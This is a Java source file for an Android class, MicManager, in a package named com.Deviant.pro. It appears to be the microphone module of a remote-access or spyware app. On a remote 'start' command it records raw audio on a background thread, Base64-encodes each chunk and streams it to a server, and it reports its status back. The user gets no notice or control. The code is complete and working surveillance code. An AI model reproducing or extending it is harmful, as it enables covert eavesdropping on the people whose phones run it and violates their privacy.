package com.Deviant.pro;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Base64;
import android.util.Log;

import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.util.concurrent.atomic.AtomicBoolean;

public class MicManager {

    private static final String TAG = "MicManager";

    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT   = AudioFormat.ENCODING_PCM_16BIT;

    /** Accepted sample rates — validated before use. */
    private static final int[] VALID_SAMPLE_RATES = {
            8000, 11025, 16000, 22050, 44100
    };
    private static final int DEFAULT_SAMPLE_RATE = 11025;

    // -------------------------------------------------------------------------
    // State — all guarded by the class monitor or AtomicBoolean
    // -------------------------------------------------------------------------

    /** ✅ AtomicBoolean — read by recording thread, written by stop/start. */
    private static final AtomicBoolean isStreaming = new AtomicBoolean(false);

    /**
     * ✅ Guarded by synchronized(MicManager.class) on every access.
     * The recording thread snapshots a local reference before reading
     * so stopStreaming() can null this safely.
     */
    private static AudioRecord audioRecord;
    private static Thread      recordingThread;

    // -------------------------------------------------------------------------
    // Public API
    // -------------------------------------------------------------------------

    public static void handle(Context context, JSONObject jo) {
        String action = jo.optString("action", "start");
        switch (action) {
            case "start":
                int sampleRate = validateSampleRate(
                        jo.optInt("sample_rate", DEFAULT_SAMPLE_RATE));
                startStreaming(context, sampleRate);
                break;
            case "stop":
                stopStreaming();
                break;
            default:
                Log.w(TAG, "Unknown mic action: " + action);
                break;
        }
    }

    // -------------------------------------------------------------------------
    // Start
    // -------------------------------------------------------------------------

    private static synchronized void startStreaming(Context context, int sampleRate) {
        if (isStreaming.get()) {
            Log.d(TAG, "Already streaming — ignoring start");
            return;
        }

        // ✅ Permission check before touching hardware
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "RECORD_AUDIO permission not granted");
            sendStatus("error", "permission_denied");
            return;
        }

        // ✅ Validate buffer size — check both error codes
        int minBuffer = AudioRecord.getMinBufferSize(
                sampleRate, CHANNEL_CONFIG, AUDIO_FORMAT);
        if (minBuffer == AudioRecord.ERROR_BAD_VALUE
                || minBuffer == AudioRecord.ERROR) {
            Log.e(TAG, "Invalid audio parameters: " + sampleRate + " Hz");
            sendStatus("error", "invalid_audio_params");
            return;
        }

        // ✅ Use at least minBuffer; 4x gives smoother reads with fewer underruns
        final int bufferSize = Math.max(minBuffer * 4, 4096);

        AudioRecord recorder = null;
        try {
            recorder = new AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate,
                    CHANNEL_CONFIG,
                    AUDIO_FORMAT,
                    bufferSize);

            if (recorder.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord failed to initialize at " + sampleRate + " Hz");
                sendStatus("error", "init_failed");
                return; // recorder.release() called in finally
            }

            recorder.startRecording();
            audioRecord = recorder;
            recorder    = null; // ownership transferred — don't release in finally

            isStreaming.set(true);

            // ✅ Snapshot local reference — safe even if audioRecord is nulled by stop
            final AudioRecord capturedRecorder = audioRecord;
            final int         capturedBuffer   = bufferSize;

            recordingThread = new Thread(
                    () -> recordingLoop(capturedRecorder, capturedBuffer),
                    "mic-stream");
            recordingThread.setDaemon(true);
            recordingThread.start();

            Log.d(TAG, "Mic streaming started at " + sampleRate + " Hz"
                    + ", buffer=" + bufferSize + " bytes");
            sendStatus("started", null);

        } catch (SecurityException e) {
            Log.e(TAG, "SecurityException starting AudioRecord: " + e.getMessage(), e);
            sendStatus("error", "security_exception");
        } catch (Exception e) {
            Log.e(TAG, "Error starting mic: " + e.getMessage(), e);
            sendStatus("error", "start_failed");
        } finally {
            // ✅ Release only if ownership was NOT transferred (init failed)
            if (recorder != null) {
                try { recorder.release(); } catch (Exception ignored) {}
            }
        }
    }

    // -------------------------------------------------------------------------
    // Recording loop
    // -------------------------------------------------------------------------

    /**
     * Runs on the recording thread.
     * Uses a local snapshot of AudioRecord — never touches the static field
     * directly so stopStreaming() can null it without a race condition.
     */
    private static void recordingLoop(AudioRecord recorder, int bufferSize) {
        byte[] buffer = new byte[bufferSize];

        while (isStreaming.get()) {
            int read = recorder.read(buffer, 0, buffer.length);

            if (read == AudioRecord.ERROR_INVALID_OPERATION
                    || read == AudioRecord.ERROR_BAD_VALUE) {
                Log.e(TAG, "AudioRecord.read() error: " + read);
                break;
            }

            if (read > 0) {
                try {
                    String encoded = Base64.encodeToString(
                            buffer, 0, read, Base64.NO_WRAP);

                    JSONObject msg = new JSONObject();
                    msg.put("type",        "mic_chunk");
                    msg.put("data",        encoded);
                    msg.put("sample_rate", recorder.getSampleRate());
                    msg.put("size",        read);
                    ConnectionManager.send(msg.toString());

                } catch (Exception e) {
                    Log.e(TAG, "Error sending mic chunk: " + e.getMessage(), e);
                }
            }
        }

        Log.d(TAG, "Recording loop exited");
    }

    // -------------------------------------------------------------------------
    // Stop
    // -------------------------------------------------------------------------

    public static synchronized void stopStreaming() {
        // Guard — idempotent
        if (!isStreaming.compareAndSet(true, false)) return;

        // Interrupt thread — unblocks AudioRecord.read() if it's blocking
        Thread t = recordingThread;
        if (t != null) {
            t.interrupt();
            recordingThread = null;
        }

        // Release AudioRecord hardware
        AudioRecord recorder = audioRecord;
        audioRecord = null;

        if (recorder != null) {
            try {
                if (recorder.getRecordingState()
                        == AudioRecord.RECORDSTATE_RECORDING) {
                    recorder.stop();
                }
            } catch (Exception e) {
                Log.e(TAG, "Error stopping AudioRecord: " + e.getMessage(), e);
            } finally {
                // ✅ release() always called — even if stop() throws
                try { recorder.release(); } catch (Exception ignored) {}
            }
        }

        Log.d(TAG, "Mic streaming stopped");
        sendStatus("stopped", null);
    }

    // -------------------------------------------------------------------------
    // Helpers
    // -------------------------------------------------------------------------

    /**
     * Validates that the requested sample rate is in the supported set.
     * Falls back to default if not recognised.
     */
    private static int validateSampleRate(int requested) {
        for (int valid : VALID_SAMPLE_RATES) {
            if (valid == requested) return requested;
        }
        Log.w(TAG, "Unsupported sample rate " + requested
                + " Hz — falling back to " + DEFAULT_SAMPLE_RATE + " Hz");
        return DEFAULT_SAMPLE_RATE;
    }

    /** Send a status/error message to the server. */
    private static void sendStatus(String status, String error) {
        try {
            JSONObject jo = new JSONObject();
            jo.put("type",   "mic_status");
            jo.put("status", status);
            if (error != null) jo.put("error", error);
            ConnectionManager.send(jo.toString());
        } catch (Exception ignored) {}
    }
}
